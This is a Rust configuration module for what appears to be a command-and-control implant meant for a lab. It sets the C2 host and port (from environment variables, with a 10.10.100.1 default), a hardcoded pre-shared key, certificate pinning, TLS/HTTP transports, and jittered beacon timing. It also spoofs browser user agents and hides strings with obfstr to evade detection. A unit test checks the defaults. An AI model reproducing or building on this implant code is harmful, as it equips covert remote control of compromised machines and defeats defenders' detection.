use std::time::Duration;

#[derive(Debug, Clone)]
pub enum TransportMode {
    Tls,
    // Used by http-transport feature (transport/http.rs). Clippy sees this
    // as dead without --features http-transport.
    #[allow(dead_code)]
    Http,
}

#[derive(Debug, Clone)]
pub struct Config {
    pub host: String,
    // Used only by TLS and DoH transports; suppress unused-field lint for DNS build.
    #[allow(dead_code)]
    pub port: u16,
    pub psk: String,
    pub salt: Vec<u8>,
    // Used only by TLS and DoH transports; suppress unused-field lint for DNS build.
    #[allow(dead_code)]
    pub cert_hash: [u8; 32],
    // Fields below are read by http/dns/doh transports. Suppress rather than cfg-gate
    // (cfg on struct fields changes layout between builds).
    #[allow(dead_code)]
    pub transport: TransportMode,
    #[allow(dead_code)]
    pub beacon_interval: Duration,
    #[allow(dead_code)]
    pub beacon_jitter: f64,
    #[allow(dead_code)]
    pub user_agent: String,
    pub beacon_base_secs: f64,
}

impl Config {
    pub fn lab_default() -> Self {
        let salt_bytes =
            hex::decode(include_str!("../../certs/salt.hex").trim()).expect("invalid salt hex");
        let hash_bytes = hex::decode(include_str!("../../certs/cert_hash.hex").trim())
            .expect("invalid cert hash hex");
        let mut cert_hash = [0u8; 32];
        cert_hash.copy_from_slice(&hash_bytes);

        let host = std::env::var(obfstr::obfstr!("C2_HOST"))
            .unwrap_or_else(|_| obfstr::obfstr!("10.10.100.1").to_string());
        let port = std::env::var(obfstr::obfstr!("C2_PORT"))
            .ok()
            .and_then(|p| p.parse().ok())
            .unwrap_or(8443);

        #[cfg(feature = "http-transport")]
        let transport = TransportMode::Http;
        #[cfg(not(feature = "http-transport"))]
        let transport = TransportMode::Tls;

        #[cfg(target_os = "windows")]
        let user_agent = obfstr::obfstr!(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
             AppleWebKit/537.36 (KHTML, like Gecko) \
             Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
        )
        .to_string();
        #[cfg(not(target_os = "windows"))]
        let user_agent = obfstr::obfstr!(
            "Mozilla/5.0 (X11; Linux x86_64) \
             AppleWebKit/537.36 (KHTML, like Gecko) \
             Chrome/122.0.0.0 Safari/537.36"
        )
        .to_string();

        Self {
            host,
            port,
            psk: obfstr::obfstr!("lab-changeme-2026").to_string(),
            salt: salt_bytes,
            cert_hash,
            transport,
            beacon_interval: Duration::from_secs(30),
            beacon_jitter: 0.25,
            user_agent,
            beacon_base_secs: 7200.0,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lab_default_loads_without_cwd_dependency() {
        let cfg = Config::lab_default();
        assert!(!cfg.host.is_empty());
        assert!(cfg.port > 0);
        assert_eq!(cfg.salt.len(), 32);
        assert_eq!(cfg.cert_hash.len(), 32);
    }
}
